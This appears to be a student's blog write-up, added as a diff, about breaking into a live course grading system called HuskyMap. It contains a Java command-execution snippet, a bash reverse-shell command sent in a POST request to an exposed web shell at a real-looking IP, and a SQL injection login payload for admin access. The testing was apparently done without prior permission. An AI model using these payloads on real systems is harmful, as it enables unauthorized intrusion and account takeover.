@@ -1,0 +1,180 @@
+---
+title: '[Special: Bug Hunting] RCE and SQL Injection! (HuskyMap)'
+date: '2023-3-24'
+lastmod: '2023-3-24'
+tags: ['writeup', 'other']
+draft: true
+summary: 'A vulnerability discovered! Is this a homework platform disguised as a CTF challenge?'
+authors: ['vincent']
+layout: PostLayout
+---
+
+# Introduction
+
+HuskyMap is the homework/grading system created and used in CS211 by [Professor Varik Hoang](http://www.varikmp.net).
+Students log in with credentials provided to them at the beginning of the course, and mainly utilize two of HuskyMap's functions:
+Quiz Taking and Sanity Checks (test case validation for programming assignments).
+
+# Part 1: Discovery
+
+It was 5AM on Wednesday, and I had a calculus and biology exam on Friday and the ACT on Saturday. And just like any other student would
+with huge priorities looming ahead, the first thing I thought to do when I woke up that morning was procrastinate: by booting up my HuskyMap
+and looking for trouble! 😊
+
+The first thing I tried was testing for RCE through the sanity check system. Hijacking one of my java assignments, I appended this into the main method:
+
+```java
+String command = "ls";
+Process p;
+try {
+  p = Runtime.getRuntime().exec(command);
+  InputStream in = p.getInputStream();
+  int c;
+  while ((c = in.read()) != -1) {
+    System.out.print((char) c);
+  }
+  in.close();
+} catch (Exception e) {
+  System.out.print(e);
+}
+```
+
+I was able to confirm the command executed by viewing the error logs on HuskyMap, but this didn't come as unexpected. Many homework graders
+and online compilers all have "RCE" possibilities, but since they're virtualized nothing really comes of it.
+
+Unfortunately for HuskyMap, after some testing, I found that it wasn't virtualized at all. Now honestly I could've stopped here, but I wasn't satisfied.
+I didn't have read/write access to a lot of things, and uploading new code each time was getting time consuming with the built-in 5 minute sanity check cooldown.
+I also wanted a reverse shell, but through the sanity check, my payload wasn't working.
+`pwd` was giving me `/var/www/html/course/grading/log/work/48.17`, but I wasn't able to access any file I created by navigating to this directory. I discovered later
+that my dead-end's were due to how the grader worked, but in the meantime, what I did was map out how most of the directory tree looked.
+
+# Part 2: Reverse Shell Access
+
+After mapping out the directory tree, I looked at `cat /var/www/html/course/index.php` in particular, I noticed a particularly interesting chunk of code:
+
+```php
+<?php
+    // already logged in and has valid page
+    if (isset($_SESSION['account']))
+    {
+        include 'pages/data.php';
+        include 'pages/menu.php';
+        if ($is_valid_page_id)
+        {
+            if ($page['is_intro'])
+                include 'pages/intro.php';
+
+            include 'pages/' .$page['directory_path'] . "/" . $page['file_path'];
+            if ($account['permission'] > 0) // TODO should be more secure later
+                echo '<div style="text-align: center"><input class="btn btn-primary btn-sm" type="button" onclick="window.location.href = \'?editor=' . $page_id . '\'" value="Edit Page"></div></br/>';
+            // window.location.href = 'varikmp.com';   => simulate a mouse click
+            // window.location.replace('varikmp.com'); => simulate an HTTP redirect
+        }
+        else if ($is_valid_editor_id) // TODO should be more secure later
+        {
+            include 'pages/editor.php';
+            if ($account['permission'] > 0) // TODO should be more secure later
+            {
+                echo '<div style="text-align: center">';
+                echo '<input id="view_page" disabled class="btn btn-primary btn-sm" type="button" onclick="';
+                echo 'window.location.href = \'?page=' . $page_id . '\';';
+                echo '" value="View Page">';
+                echo '</div></br/>';
+            }
+        }
+        else if (isset($_GET["slide"])) // TODO should be more secure later
+        {
+            include 'pages/slide.php';
+        }
+        else if ($is_valid_quiz_id)
+        {
+            if ($quiz['password'] === '' || (isset($_GET['pass']) && $quiz['password'] === trim($_GET['pass'])))
+            include 'pages/quiz.php';
+        }
+        else if ($is_valid_contest_id && $contest['password'] === '' || (isset($_GET['pass']) && $contest['password'] === trim($_GET['pass'])))
+        {
+            include 'pages/contest.php';
+        }
+        else if (isset($_GET["manage"]) || isset($_POST["manage"])) // TODO should be more secure later
+        {
+            include 'pages/manage.php';
+        }
+        else if (isset($_GET["error"])) // TODO should be more secure later
+        {
+            include 'pages/error.php';
+        }
+        else if (isset($_GET["shell"]) && $account['permission'] > 0) // TODO should be more secure later
+        {
+            include 'pages/shell.php';
+        }
+        else
+        {
+            include 'pages/course.php';
+        }
+    }
+    else include 'pages/login.php';
+?>
+```
+
+_These brackets though...!!!_
+
+> TODO should be more secure later
+
+Well I guess that later hadn't occured yet because I was able to access `shell.php` just by navigating there on my browser. Reminder to configure apache correctly!
+
+![shell](/static/images/blog/writeups/other/huskymap/shell.png)
+
+I couldn't interact with it on the browser, but looking at `shell.php`, I was able to figure out it was a fork of [p0wny@shell](https://github.com/flozz/p0wny-shell)!
+
+Now for the magic, sending a POST request to `/shell.php?feature=shell` with the `cmd` field as  
+`bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"`!
+
+```
+POST http://[HUSKYMAP IP]/course/pages/shell.php?feature=shell
+POST /course/pages/shell.php?feature=shell HTTP/1.1
+User-Agent: PostmanRuntime/7.29.2
+Accept: */*
+Cache-Control: no-cache
+Postman-Token: [Removed]
+Host: 18.224.94.128
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+
+cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[IP]%2F[PORT]%200%3E%261%22
+```
+
+Reverse Shell Get!
+
+# Part 3: Login SQL Injection
+
+After getting the reverse shell, I decided to poke around a bit more. One thing that really stuck out to me is how the login was handled in `login.php`
+
+```php
+$username = trim($_POST['username']);
+$password = trim($_POST['password']);
+
+$db = new SQLite3('db/course.db');
+$query  = 'select * from user ';
+$query .= 'where username = "' . $username . '" and is_active = 1';
+
+$result = $db->query($query);
+$user = $result->fetchArray();
+
+if ($user && password_verify($password, $user['password']))
+{
+  ...
+}
+```
+
+Wow, a string concatenated SQL statement! Referencing [this](https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify) post along with the
+course database, our final payload is as follows:
+
+Username: `admin" UNION SELECT 1, 'admin', '$1$d39Yd9ds$B.wYz.OSxB/HdGmKWWpP10', 'admin', '', '', '', 2, 1 ;--`  
+Password: `SQLInjection!!!` (hash generated using PHP `crypt()`)
+
+# Conclusion
+
+Although the vulnerability discovered here isn't the most innovative, it was a good exercise and a reminder that not all application in production are completely secure.
+Thank you to Professor Varik for being so open to my little endeavour, and for being an awesome CS211 instructor!
